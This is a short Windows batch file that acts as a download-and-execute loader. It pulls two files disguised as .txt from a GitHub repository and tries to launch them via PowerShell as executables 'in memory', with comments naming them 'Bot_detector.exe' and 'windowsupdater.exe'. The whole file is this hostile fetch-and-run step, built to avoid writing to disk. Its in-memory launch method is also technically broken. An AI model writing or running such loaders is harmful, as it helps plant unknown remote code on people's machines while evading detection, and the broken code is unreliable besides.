@echo off
REM Define URLs for the EXEs
set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest1.txt
set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest2.txt

REM Use PowerShell to download and execute the EXEs without saving them to disk

REM Download and execute Bot_detector.exe in memory
powershell -Command "
    $url1 = '%U1%'
    $exe1 = (Invoke-WebRequest -Uri $url1).Content
    Start-Process -FilePath (New-Object System.IO.MemoryStream(,$exe1)) -NoNewWindow
"

REM Download and execute windowsupdater.exe in memory
powershell -Command "
    $url2 = '%U2%'
    $exe2 = (Invoke-WebRequest -Uri $url2).Content
    Start-Process -FilePath (New-Object System.IO.MemoryStream(,$exe2)) -NoNewWindow
"

exit
